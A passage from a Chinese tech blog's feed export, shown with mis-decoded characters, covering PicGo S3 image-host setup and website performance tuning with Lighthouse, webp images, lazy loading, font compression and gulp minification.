alt="avatar"></p><p>ç”±äºç¼¤çº·äº‘ä¸æ˜¯PicGoå®˜æ–¹æ”¯æŒçš„äº‘æœåŠ¡å‚å•†, æ‰€ä»¥å¾—é æ’ä»¶æ¥å®ç°, ç”±äºæ”¯æŒs3 api, æ‰€ä»¥æˆ‘é€‰æ‹©äº†Amazon s3æ’ä»¶<br><img src="https://pb01.s3.bitiful.net/180.webp" alt="avatar"></p><p><strong>é…ç½®</strong><br><img src="https://pb01.s3.bitiful.net/181.webp" alt="avatar"></p><p>åº”ç”¨ç§˜é’¥IDå¡«Access Key, åº”ç”¨ç§˜é’¥å¡«Secret Key, æ¡¶åå¡«ä½ åˆ›å»ºçš„æ¡¶å, æ–‡ä»¶è·¯å¾„éšä¾¿å¡«(ç¬¦åˆæ ¼å¼å°±è¡Œ), åœ°åŒºå’Œè‡ªå®šä¹‰èŠ‚ç‚¹åœ¨æ¡¶ä¿¡æ¯ä¸­éƒ½æœ‰</p><p><img src="https://pb01.s3.bitiful.net/182.webp" alt="avatar"></p><p>è¦æ³¨æ„çš„æ˜¯åœ¨å¡«è‡ªå®šä¹‰èŠ‚ç‚¹çš„æ—¶å€™å‰é¢è¦åŠ ä¸Šhttps://, å¦åˆ™ä¼šæŠ¥é”™<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TypeError [ERR_INVALID_URL]: Invalid URL</span><br><span class="line">    at new NodeError (node:internal/errors:371:5)</span><br><span class="line">    at onParseError (node:internal/url:552:9)</span><br><span class="line">    at new URL (node:internal/url:628:5)</span><br><span class="line">    at parseUrl (C:\Users\levit\AppData\Roaming\picgo\node_modules\@smithy\url-parser\dist-cjs\index.js:29:21)</span><br><span class="line">    at toEndpointV1 (C:\Users\levit\AppData\Roaming\picgo\node_modules\@smithy\middleware-endpoint\dist-cjs\index.js:112:41)</span><br><span class="line">    at customEndpointProvider (C:\Users\levit\AppData\Roaming\picgo\node_modules\@smithy\middleware-endpoint\dist-cjs\index.js:232:65)</span><br></pre></td></tr></table></figure><br><img src="https://pb01.s3.bitiful.net/183.webp" alt="avatar"></p><p> å®ƒä»¬å®˜æ–¹å’Œæ’ä»¶æ–‡æ¡£å†™çš„æ˜¯åŒ¹é…çš„, å¯¼è‡´ä¸€å¼€å§‹è®©æˆ‘ä»¥ä¸ºæ˜¯æˆ‘çš„Node.jsç‰ˆæœ¬å¤ªé«˜å¯¼è‡´çš„</p><p> å·®ç‚¹å¿˜äº†, PicGoæ’ä»¶éœ€è¦16.0.0ç‰ˆæœ¬ä»¥ä¸Šçš„Node.jsæ‰è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> å›¾åºŠ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç«™æ€§èƒ½æ£€æµ‹ä¸ä¼˜åŒ–</title>
      <link href="/2024/04/20/2024-4-20-%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD/"/>
      <url>/2024/04/20/2024-4-20-%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="ç½‘ç«™æ€§èƒ½æ£€æµ‹ä¸ä¼˜åŒ–"><a href="#ç½‘ç«™æ€§èƒ½æ£€æµ‹ä¸ä¼˜åŒ–" class="headerlink" title="ç½‘ç«™æ€§èƒ½æ£€æµ‹ä¸ä¼˜åŒ–"></a>ç½‘ç«™æ€§èƒ½æ£€æµ‹ä¸ä¼˜åŒ–</h2><h3 id="æ€§èƒ½æ£€æµ‹"><a href="#æ€§èƒ½æ£€æµ‹" class="headerlink" title="æ€§èƒ½æ£€æµ‹"></a>æ€§èƒ½æ£€æµ‹</h3><h4 id="Lighthouse"><a href="#Lighthouse" class="headerlink" title="Lighthouse"></a>Lighthouse</h4><p>Lighthouse æ˜¯ä¸€ä¸ªç½‘ç«™æ€§èƒ½æµ‹è¯„å·¥å…·ï¼Œ å®ƒæ˜¯ Google Chrome æ¨å‡ºçš„ä¸€ä¸ªå¼€æºè‡ªåŠ¨åŒ–å·¥å…·ï¼Œèƒ½å¤Ÿå¯¹ PWA å’Œç½‘é¡µå¤šæ–¹é¢çš„æ•ˆæœæŒ‡æ ‡è¿›è¡Œè¯„æµ‹ï¼Œå¹¶ç»™å‡ºæœ€ä½³å®è·µçš„å»ºè®®ä»¥å¸®åŠ©å¼€å‘è€…æ”¹è¿›ç½‘ç«™çš„è´¨é‡ã€‚å®ƒçš„ä½¿ç”¨æ–¹æ³•ä¹Ÿéå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦æä¾›ä¸€ä¸ªè¦æµ‹è¯„çš„ç½‘å€ï¼Œå®ƒå°†é’ˆå¯¹æ­¤é¡µé¢è¿è¡Œä¸€ç³»åˆ—çš„æµ‹è¯•ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªæœ‰å…³é¡µé¢æ€§èƒ½çš„æŠ¥å‘Šã€‚é€šè¿‡æŠ¥å‘Šæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“éœ€è¦é‡‡å–å“ªäº›æªæ–½æ¥æ”¹è¿›åº”ç”¨çš„æ€§èƒ½å’Œä½“éªŒã€‚</p><p>åœ¨é«˜ç‰ˆæœ¬ï¼ˆåº”è¯¥æ˜¯ &gt;= 60ï¼‰çš„ Chrome æµè§ˆå™¨ä¸­ï¼ŒLighthouse å·²ç»ç›´æ¥é›†æˆåˆ°äº†è°ƒè¯•å·¥å…· DevTools ä¸­äº†ï¼Œå› æ­¤ä¸éœ€è¦è¿›è¡Œä»»ä½•å®‰è£…æˆ–ä¸‹è½½ã€‚æŒ‰ F12 æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ consoleã€security ç­‰é€‰é¡¹åé¢æœ‰ä¸€ä¸ª Lighthouse ï¼ˆä½ç‰ˆæœ¬çš„è°·æ­Œæµè§ˆå™¨å¯èƒ½æ˜¾ç¤ºçš„æ˜¯ Auditsï¼‰é€‰é¡¹ï¼Œé€‰æ‹©è¯¥é€‰é¡¹ï¼Œç„¶åç‚¹å‡» Analyse page load å³å¯ã€‚</p><p><img src="https://pb01.s3.bitiful.net/171.webp" alt="avatar"></p><p>ä½¿ç”¨ Lighthouse å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯„åï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä»½è¯„åˆ†æŠ¥å‘Šï¼Œå®ƒåŒ…å«äº†æ€§èƒ½ï¼ˆPerformanceï¼‰ï¼Œè®¿é—®æ— éšœç¢ï¼ˆAccessibilityï¼‰ï¼Œæœ€ä½³å®è·µï¼ˆBest Practiceï¼‰ï¼Œæœç´¢å¼•æ“ä¼˜åŒ–ï¼ˆSEOï¼‰ï¼ŒPWAï¼ˆProgressive Web Appï¼‰äº”ä¸ªéƒ¨åˆ†ï¼š</p><p><img src="https://pb01.s3.bitiful.net/169.webp" alt="avatar"></p><p>è¿˜æœ‰è¯¦ç»†çš„åˆ†æ:</p><p><img src="https://pb01.s3.bitiful.net/170.webp" alt="avatar"></p><p>ä»è¿™å¼ å›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ä¸»è¦éœ€è¦ä¼˜åŒ–çš„æœ‰:å›¾ç‰‡,æ–‡æœ¬,csså’Œjsç­‰é™æ€èµ„æº</p><h5 id="æ€§èƒ½ï¼ˆPerformanceï¼‰"><a href="#æ€§èƒ½ï¼ˆPerformanceï¼‰" class="headerlink" title="æ€§èƒ½ï¼ˆPerformanceï¼‰"></a>æ€§èƒ½ï¼ˆPerformanceï¼‰</h5><p>æ€§èƒ½è¯„åˆ†çš„åˆ†å€¼åŒºé—´æ˜¯0åˆ°100ï¼Œå¦‚æœå‡ºç°0åˆ†ï¼Œé€šå¸¸æ˜¯åœ¨è¿è¡Œ Lighthouse æ—¶å‘ç”Ÿäº†é”™è¯¯ï¼Œæ»¡åˆ†100åˆ†ä»£è¡¨äº†ç½‘ç«™å·²ç»è¾¾åˆ°äº†98åˆ†ä½å€¼çš„æ•°æ®ï¼Œè€Œ50åˆ†åˆ™æ˜¯75åˆ†ä½å€¼çš„æ•°æ®ã€‚</p><p>å½±å“è¯„åˆ†çš„æ€§èƒ½æŒ‡æ ‡ï¼šæ€§èƒ½æµ‹è¯•ç»“æœä¼šåˆ†æˆ Metricsï¼ŒDiagnosticï¼ŒOpportunities ä¸‰éƒ¨åˆ†ï¼Œä½†åªæœ‰ Metrics éƒ¨åˆ†çš„æŒ‡æ ‡é¡¹ä¼šå¯¹åˆ†æ•°äº§ç”Ÿç›´æ¥å½±å“ã€‚</p><p>Lighthouse ä¼šè¡¡é‡ä»¥ä¸‹ Metrics æ€§èƒ½æŒ‡æ ‡é¡¹ï¼š</p><ul><li>é¦–æ¬¡å†…å®¹ç»˜åˆ¶ï¼ˆFirst Contentful Paintï¼‰ã€‚å³æµè§ˆå™¨é¦–æ¬¡å°†ä»»æ„å†…å®¹ï¼ˆå¦‚æ–‡å­—ã€å›¾åƒã€canvas ç­‰ï¼‰ç»˜åˆ¶åˆ°å±å¹•ä¸Šçš„æ—¶é—´ç‚¹ã€‚</li><li>é¦–æ¬¡æœ‰æ•ˆç»˜åˆ¶ï¼ˆFirst Meaningful Paintï¼‰ã€‚è¡¡é‡äº†ç”¨æˆ·æ„ŸçŸ¥é¡µé¢çš„ä¸»è¦å†…å®¹ï¼ˆprimary contentï¼‰å¯è§çš„æ—¶é—´ã€‚å¯¹äºä¸åŒçš„ç«™ç‚¹ï¼Œé¦–è¦å†…å®¹æ˜¯ä¸åŒçš„ï¼Œä¾‹å¦‚ï¼šå¯¹äºåšå®¢æ–‡ç« ï¼Œæ ‡é¢˜åŠé¦–å±æ–‡å­—æ˜¯é¦–è¦å†…å®¹ï¼Œè€Œå¯¹äºè´­ç‰©ç½‘ç«™æ¥è¯´ï¼Œå›¾ç‰‡ä¹Ÿä¼šå˜å¾—å¾ˆé‡è¦ã€‚</li><li>é¦–æ¬¡ CPU ç©ºé—²ï¼ˆFirst CPU Idleï¼‰ã€‚å³é¡µé¢é¦–æ¬¡èƒ½å¤Ÿå¯¹è¾“å…¥åšå‡ºååº”çš„æ—¶é—´ç‚¹ï¼Œå…¶å‡ºç°æ—¶æœºå¾€å¾€åœ¨é¦–æ¬¡æœ‰æ•ˆç»˜åˆ¶å®Œæˆä¹‹åã€‚è¯¥æŒ‡æ ‡ç›®å‰ä»å¤„äºå®éªŒé˜¶æ®µã€‚</li><li>å¯äº¤äº’æ—¶é—´ï¼ˆTime to Interactiveï¼‰ã€‚æŒ‡çš„æ˜¯æ‰€æœ‰çš„é¡µé¢å†…å®¹éƒ½å·²ç»æˆåŠŸåŠ è½½ï¼Œä¸”èƒ½å¤Ÿå¿«é€Ÿåœ°å¯¹ç”¨æˆ·çš„æ“ä½œåšå‡ºååº”çš„æ—¶é—´ç‚¹ã€‚è¯¥æŒ‡æ ‡ç›®å‰ä»å¤„äºå®éªŒé˜¶æ®µã€‚</li><li>é€Ÿåº¦æŒ‡æ ‡ï¼ˆSpeed Indexï¼‰ã€‚è¡¡é‡äº†é¦–å±å¯è§å†…å®¹ç»˜åˆ¶åœ¨å±å¹•ä¸Šçš„é€Ÿåº¦ã€‚åœ¨é¦–æ¬¡åŠ è½½é¡µé¢çš„è¿‡ç¨‹ä¸­å°½é‡å±•ç°æ›´å¤šçš„å†…å®¹ï¼Œå¾€å¾€èƒ½ç»™ç”¨æˆ·å¸¦æ¥æ›´å¥½çš„ä½“éªŒï¼Œæ‰€ä»¥é€Ÿåº¦æŒ‡æ ‡çš„å€¼çº¦å°è¶Šå¥½ã€‚</li><li>è¾“å…¥å»¶è¿Ÿä¼°å€¼ï¼ˆEstimated Input Latencyï¼‰ã€‚è¿™ä¸ªæŒ‡æ ‡è¡¡é‡äº†é¡µé¢å¯¹ç”¨æˆ·è¾“å…¥è¡Œä¸ºçš„ååº”é€Ÿåº¦ï¼Œå…¶åŸºå‡†å€¼åº”ä½äº 50msã€‚</li></ul><p>Metrics éƒ¨åˆ†çš„æŒ‡æ ‡é¡¹ä¼šç›´æ¥å½±å“åˆ†æ•°ï¼Œå¯ä»¥ä½œä¸ºæˆ‘ä»¬çš„ä¸»è¦å‚è€ƒç‚¹ã€‚</p><p>å¦å¤–çš„ä¸¤éƒ¨åˆ†ä¸­ï¼Œ Opportunities æŒ‡çš„æ˜¯ä¼˜åŒ–æœºä¼šï¼Œå®ƒæä¾›äº†è¯¦ç»†çš„å»ºè®®å’Œæ–‡æ¡£ï¼Œæ¥è§£é‡Šä½åˆ†çš„åŸå› ï¼Œå¸®åŠ©æˆ‘ä»¬å…·ä½“è¿›è¡Œå®ç°å’Œæ”¹è¿›ã€‚Diagnostics æŒ‡çš„æ˜¯ç°åœ¨å­˜åœ¨çš„é—®é¢˜ï¼Œä¸ºè¿›ä¸€æ­¥æ”¹å–„æ€§èƒ½çš„å®éªŒå’Œè°ƒæ•´ç»™å‡ºäº†æŒ‡å¯¼ã€‚è¿™ä¸¤è€…ä¸ä¼šçº³å…¥åˆ†æ•°çš„è®¡ç®—ã€‚</p><p>æ¯ä¸€é¡¹æ€§èƒ½æŒ‡æ ‡å¯¹è¯„åˆ†çš„è´¡çŒ®éƒ½æœ‰å…¶è®¡ç®—é€»è¾‘ï¼ŒLighthouse ä¼šå°†åŸå§‹çš„æ€§èƒ½å€¼æ˜ å°„æˆä¸º 0-100 ä¹‹é—´çš„æ•°å­—ã€‚</p><p>é’ˆå¯¹ä¸åŒçš„è¯„åˆ†ï¼ŒLighthouse ç”¨äº†ä¸åŒçš„é¢œè‰²è¿›è¡Œæ ‡æ³¨ï¼Œåˆ†å€¼åŒºé—´å’Œé¢œè‰²çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><ul><li><code>0 - 49ï¼ˆæ…¢ï¼‰ï¼šçº¢è‰²</code></li><li><code>50 - 89ï¼ˆå¹³å‡å€¼ï¼‰ï¼š æ©™è‰²</code></li><li><code>90 - 100ï¼ˆå¿«ï¼‰ï¼š ç»¿è‰²</code></li></ul><h5 id="è®¿é—®æ— éšœç¢ï¼ˆAccessibilityï¼‰"><a href="#è®¿é—®æ— éšœç¢ï¼ˆAccessibilityï¼‰" class="headerlink" title="è®¿é—®æ— éšœç¢ï¼ˆAccessibilityï¼‰"></a>è®¿é—®æ— éšœç¢ï¼ˆAccessibilityï¼‰</h5><p>è®¿é—®æ— éšœç¢è¯„åˆ†çš„åˆ†å€¼ç”±ç›¸å…³æŒ‡æ ‡çš„åŠ æƒå¹³å‡å€¼è®¡ç®—è€Œæ¥ã€‚å¯ä»¥åœ¨è¯„åˆ†è¯¦æƒ…æŸ¥é˜…æ¯é¡¹æŒ‡æ ‡çš„å…·ä½“æƒé‡ã€‚åŒç†ï¼Œè¾ƒå¤§æƒé‡çš„æŒ‡æ ‡é¡¹å¯¹åˆ†æ•°çš„å½±å“è¾ƒå¤§ã€‚</p><p>æ— éšœç¢æ€§çš„æ¯ä¸ªæŒ‡æ ‡é¡¹æµ‹è¯•ç»“æœä¸ºpassæˆ–è€…failï¼Œä¸æ€§èƒ½æŒ‡æ ‡é¡¹çš„è®¡ç®—æ–¹å¼ä¸åŒï¼Œå½“é¡µé¢åªæ˜¯éƒ¨åˆ†é€šè¿‡æŸé¡¹æŒ‡æ ‡æ—¶ï¼Œé¡µé¢çš„è¿™é¡¹æŒ‡æ ‡å°†ä¸ä¼šå¾—åˆ†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé¡µé¢ä¸­çš„ä¸€äº›å…ƒç´ æœ‰å±å¹•é˜…è¯»å™¨å‹å¥½çš„å‘½åï¼Œè€Œå…¶ä»–çš„å…ƒç´ æ²¡æœ‰ï¼Œé‚£ä¹ˆè¿™ä¸ªé¡µé¢çš„ screenreader-friendly-names æŒ‡æ ‡é¡¹å¾—åˆ†ä¸º0ã€‚</p><h5 id="æœ€ä½³å®è·µï¼ˆä¼˜åŒ–ï¼‰ï¼ˆBest-Practiceï¼‰"><a href="#æœ€ä½³å®è·µï¼ˆä¼˜åŒ–ï¼‰ï¼ˆBest-Practiceï¼‰" class="headerlink" title="æœ€ä½³å®è·µï¼ˆä¼˜åŒ–ï¼‰ï¼ˆBest Practiceï¼‰"></a>æœ€ä½³å®è·µï¼ˆä¼˜åŒ–ï¼‰ï¼ˆBest Practiceï¼‰</h5><p>æœ€ä½³å®è·µè¯„åˆ†çš„åˆ†æ•°åŒºé—´ä¸º0-100ã€‚å½±å“è¿™é¡¹è¯„åˆ†çš„æŒ‡æ ‡é¡¹çš„æƒé‡éƒ½æ˜¯ç›¸åŒçš„ã€‚</p><p>æ¯”å¦‚ï¼šæ¨èä½¿ç”¨ httpsï¼Œè·¨åŸŸçš„è·³è½¬é“¾æ¥éœ€è¦ä½¿ç”¨ rel æ ‡è¯†ï¼Œä¸èƒ½ä½¿ç”¨åºŸå¼ƒçš„ APIç­‰ç­‰ã€‚</p><h5 id="æœç´¢å¼•æ“ä¼˜åŒ–ï¼ˆSEOï¼‰"><a href="#æœç´¢å¼•æ“ä¼˜åŒ–ï¼ˆSEOï¼‰" class="headerlink" title="æœç´¢å¼•æ“ä¼˜åŒ–ï¼ˆSEOï¼‰"></a>æœç´¢å¼•æ“ä¼˜åŒ–ï¼ˆSEOï¼‰</h5><p>æ¯”å¦‚ï¼šå›¾ç‰‡å…ƒç´ ä½¿ç”¨ alt å±æ€§ç­‰ç­‰æé«˜æœç´¢å¼•æ“æœç´¢æ’åï¼Œä¾¿äºæœç´¢å¼•æ“èƒ½æ‰¾åˆ°ä½ è¿™ä¸ªç½‘ç«™ã€‚</p><h5 id="PWAï¼ˆProgressive-Web-Appï¼‰"><a href="#PWAï¼ˆProgressive-Web-Appï¼‰" class="headerlink" title="PWAï¼ˆProgressive Web Appï¼‰"></a>PWAï¼ˆProgressive Web Appï¼‰</h5><p>Lighthouse ä½¿ç”¨ PWA åŸºå‡†æ£€æŸ¥é¡¹åˆ—è¡¨ï¼ˆBaseline PWA Checklistï¼‰è¿›è¡Œæµ‹è¯„ï¼Œæµ‹è¯„ç»“æœå°†è¿™äº›æŒ‡æ ‡é¡¹åˆ†æˆäº†å››ä¸ªç±»åˆ«ï¼Œå…±åŒ…å«12ä¸ªè‡ªåŠ¨æµ‹è¯•é¡¹å’Œ3ä¸ªæ‰‹åŠ¨æµ‹è¯•é¡¹ï¼Œå…¶ä¸­å„ä¸ªè‡ªåŠ¨æµ‹è¯•é¡¹çš„è¯„åˆ†æƒé‡æ˜¯ç›¸åŒçš„ã€‚PWA çš„è¯„æµ‹æŒ‡æ ‡å¯¹æˆ‘ä»¬æ¥è¯´éå¸¸é‡è¦ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™å››ä¸ªç±»åˆ«è¯¦ç»†äº†è§£ä¸€ä¸‹åŸºå‡†æŒ‡æ ‡é¡¹ã€‚</p><p><strong>å¿«é€Ÿå¯é </strong>ï¼š</p><ol><li>é¡µé¢åœ¨ç§»åŠ¨ç½‘ç»œæ¡ä»¶ä¸‹èƒ½å¤Ÿå¿«é€ŸåŠ è½½ã€‚</li><li>åœ¨ç¦»çº¿æ¡ä»¶ä¸‹é¡µé¢èƒ½å¤Ÿè¿”å›çŠ¶æ€ç 200ã€‚</li><li>start_url åœ¨ç¦»çº¿æ¡ä»¶ä¸‹è¿”å›çŠ¶æ€ç 200ã€‚æ‰“å¼€è¯¥ PWA æ—¶åŠ è½½çš„ URLã€‚</li></ol><p><strong>å¯å®‰è£…</strong>ï¼š</p><ol><li>å§‹ç»ˆä½¿ç”¨ HTTPSã€‚</li><li>æ³¨å†Œ Service Worker æ¥ç¼“å­˜é¡µé¢ä»¥åŠ start_urlã€‚</li><li>ä½¿ç”¨ manifest æ–‡ä»¶æ¥å®ç°å®‰è£… PWA çš„éœ€æ±‚ï¼Œæµè§ˆå™¨èƒ½å¤Ÿä¸»åŠ¨é€šçŸ¥ç”¨æˆ·å°†åº”ç”¨æ·»åŠ åˆ°æ¡Œé¢ï¼Œå¢åŠ ç•™å­˜ç‡ã€‚</li></ol><p><strong>PWA ä¼˜åŒ–</strong>ï¼š</p><ol><li>å°† HTTP æµé‡é‡å®šå‘åˆ° HTTPSã€‚</li><li>é…ç½®è‡ªå®šä¹‰å¯åŠ¨ç”»é¢ã€‚</li><li>è®¾ç½®åœ°å€æ ä¸»é¢˜é¢œè‰²ã€‚</li><li>é¡µé¢å†…å®¹é’ˆå¯¹è§†å£å¤§å°è‡ªé€‚åº”ï¼Œå¯¹ç§»åŠ¨ç”¨æˆ·çš„å±•ç¤ºæ›´å‹å¥½ã€‚</li><li>ä½¿ç”¨äº†æ ‡ç­¾ï¼Œå¹¶è®¾ç½®äº† width æˆ– initial-scale å±æ€§ã€‚</li><li>å½“ JavaScript æ–‡ä»¶ä¸å¯ç”¨æ—¶ï¼Œæä¾›é™çº§æªæ–½ï¼Œé¡µé¢èƒ½æ˜¾ç¤ºåŸºæœ¬å†…å®¹è€Œä¸å‡ºç°ç™½å±ã€‚</li></ol><p><strong>æ‰‹åŠ¨æµ‹è¯•é¡¹</strong>ï¼š</p><ol><li>ç«™ç‚¹è·¨æµè§ˆå™¨å¯ç”¨ï¼Œå¦‚ä¸»æµæµè§ˆå™¨ Chrome, Edge, Firefox åŠ Safari ç­‰ã€‚</li><li>é¡µé¢é—´åˆ‡æ¢æµç•…ï¼Œå³ä½¿åœ¨è¾ƒå·®çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œåˆ‡æ¢åŠ¨ç”»ä¹Ÿåº”è¯¥ç®€æ´é¡ºç•…ï¼Œè¿™æ˜¯æé«˜ç”¨æˆ·æ„ŸçŸ¥ä½“éªŒçš„å…³é”®ã€‚</li><li>ä¿è¯æ¯ä¸ªé¡µé¢éƒ½æœ‰ç‹¬ä¸€æ— äºŒçš„ URLï¼Œèƒ½å¤Ÿåœ¨æ–°çš„æµè§ˆå™¨çª—å£æ‰“å¼€ï¼Œä¸”æ–¹ä¾¿åœ¨ç¤¾äº¤åª’ä½“ä¸Šè¿›è¡Œåˆ†äº«ã€‚</li><li>é™¤äº†ä¸Šè¿°åŸºå‡†æŒ‡æ ‡é¡¹ä¹‹å¤–ï¼Œä¸ºäº†è®© PWA çš„ä½“éªŒæ›´åŠ å®Œç¾ï¼Œè¿˜æœ‰ä¸€äº› Lighthouse æœªå®ç°æ£€æŸ¥çš„è¿›é˜¶æŒ‡æ ‡ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ä½œä¸ºç¤ºèŒƒæ€§å‚è€ƒçš„ PWA çš„æŒ‡æ ‡ï¼Œæ¯”å¦‚ç”¨æˆ·ä½“éªŒã€ç¼“å­˜ã€æ¨é€é€šçŸ¥ç­‰ç­‰ã€‚</li></ol><h3 id="æ€§èƒ½ä¼˜åŒ–"><a href="#æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–"></a>æ€§èƒ½ä¼˜åŒ–</h3><h4 id="å›¾ç‰‡ä¼˜åŒ–"><a href="#å›¾ç‰‡ä¼˜åŒ–" class="headerlink" title="å›¾ç‰‡ä¼˜åŒ–"></a>å›¾ç‰‡ä¼˜åŒ–</h4><p>æ•´ä½“æ€è·¯å°±æ˜¯<code>å‹ç¼©å›¾ç‰‡</code>ï¼Œå‡å°‘å›¾ç‰‡ä½“ç§¯ï¼Œæé«˜åŠ è½½é€Ÿåº¦.æ¨èé‡‡ç”¨webpæ ¼å¼,åœ¨å›¾ç‰‡è´¨é‡ç›¸ä¼¼çš„æƒ…å†µä¸‹å¯ä»¥èŠ‚çœçº¦50%çš„ä½“ç§¯</p><p>æˆ‘ä¹‹å‰çš„å›¾ç‰‡ä»¥pngä¸ºä¸»,è¿˜æœ‰ä¸€éƒ¨åˆ†æ˜¯webp,ç”±äºå›¾ç‰‡å¤ªå¤š,å…¨è½¬å¾ˆéº»çƒ¦,æˆ‘å…ˆå°†éƒ¨åˆ†å¸¸ç”¨png(èƒŒæ™¯å›¾,å°é¢å›¾ç­‰)è½¬æˆäº†webp,ç„¶åå°†å…¨éƒ¨pngè¿›è¡Œå‹ç¼©,ä¹‹åæ–°å¢çš„å›¾ç‰‡å…¨è½¬ä¸ºwebpæ ¼å¼</p><p>ä½¿ç”¨å·¥å…·:<a href="https://imagestool.com/zh_CN/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">imagestool</a>,æ”¯æŒæ‰¹é‡è½¬æ¢,è½¬æ¢é€Ÿåº¦å¾ˆå¿«</p><p>è¿˜æœ‰å°±æ˜¯<code>æ‡’åŠ è½½</code>,æœ‰èŠ‚çœæµé‡ä¸æé«˜æ€§èƒ½çš„ä½œç”¨ã€‚Butterflyä¸»é¢˜å†…ç½®äº†å›¾ç‰‡æ‡’åŠ è½½çš„é€‰é¡¹ï¼Œåœ¨_config.butterfly.ymlæ–‡ä»¶ä¸‹å°†å¯¹åº”é¡¹è®¾ç½®ä¸ºå¦‚ä¸‹å³å¯ï¼š</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Lazyload (åœ–ç‰‡æ‡¶åŠ è¼‰)</span></span><br><span class="line"><span class="comment"># https://github.com/verlok/vanilla-lazyload</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># site/post é€‰æ‹©åœ¨å“ªäº›åœ°æ–¹å¯ç”¨å›¾ç‰‡æ‡’åŠ è½½</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="comment"># ä½ è‡ªå·±å–œæ¬¢çš„å›¾ç‰‡</span></span><br><span class="line">  <span class="attr">blur:</span> <span class="literal">true</span><span class="comment"># æ¨¡ç³Šæ•ˆæœ</span></span><br></pre></td></tr></table></figure><h4 id="å­—ä½“ä¼˜åŒ–"><a href="#å­—ä½“ä¼˜åŒ–" class="headerlink" title="å­—ä½“ä¼˜åŒ–"></a>å­—ä½“ä¼˜åŒ–</h4><p>ä»Lighthouseçš„è¯¦æƒ…åˆ†æä¸­æˆ‘å¾—çŸ¥ç½‘ç«™é¦–é¡µçš„å­—ä½“åŠ è½½é€Ÿåº¦å¾ˆæ…¢,å¦‚å›¾:</p><p><img src="https://pb01.s3.bitiful.net/172.webp" alt="avatar"></p><p>æˆ‘ä»¬ä»ç½‘ä¸Šä¸‹è½½çš„å­—ä½“é€šå¸¸éƒ½æ˜¯TTFæ ¼å¼ï¼Œttf(TrueTypeFont)æ˜¯ä¸€ç§å­—åº“åç§°ï¼Œæ˜¯Appleå…¬å¸å’ŒMicrosoftå…¬å¸å…±åŒæ¨å‡ºçš„å­—ä½“æ–‡ä»¶æ ¼å¼ï¼Œä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ ¼å¼ä¹‹ä¸€ï¼Œä½†æ˜¯ä¸€äº›å¥½çœ‹çš„å­—ä½“å¾€å¾€ä½“ç§¯éƒ½ä¼šå¾ˆå¤§ï¼Œç½‘ç«™æ¯æ¬¡è¿›å»éƒ½è¦åŠ è½½ä¸€ä¸ªè¿™ä¹ˆå¤§çš„æ–‡ä»¶ï¼Œé€Ÿåº¦è‚¯å®šä¼šå¾ˆæ…¢ï¼</p><p>é‡‡ç”¨fonttoolsç¼–ç å‹ç¼©+è½¬woff2æ ¼å¼äºŒçº§å‹ç¼©,å‚è€ƒ<a href="https://blog.csdn.net/littleduo/article/details/124563106" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">æœ‰æ•ˆçš„å­—ä½“å‹ç¼©æ–¹æ³•</a></p><h4 id="é™æ€èµ„æºä¼˜åŒ–"><a href="#é™æ€èµ„æºä¼˜åŒ–" class="headerlink" title="é™æ€èµ„æºä¼˜åŒ–"></a>é™æ€èµ„æºä¼˜åŒ–</h4><p>å®‰è£…Gulpæ’ä»¶ï¼šåœ¨åšå®¢æ ¹ç›®å½•[Blogroot]æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install --global gulp-cli <span class="comment">#å…¨å±€å®‰è£…gulpæŒ‡ä»¤é›†</span></span><br><span class="line">npm install gulp --save <span class="comment">#å®‰è£…gulpæ’ä»¶</span></span><br></pre></td></tr></table></figure><p>å®‰è£…å„ä¸ªä¸‹å±æ’ä»¶ä»¥å®ç°å¯¹å„ç±»é™æ€èµ„æºçš„å‹ç¼©</p><p><strong>HTMLå‹ç¼©</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-htmlclean --save-dev</span><br><span class="line">npm install gulp-html-minifier-terser --save-dev</span><br><span class="line"><span class="comment"># ç”¨gulp-html-minifier-terserå¯ä»¥å‹ç¼©HTMLä¸­çš„ES6è¯­æ³•</span></span><br></pre></td></tr></table></figure></p><p><strong>CSSå‹ç¼©</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install 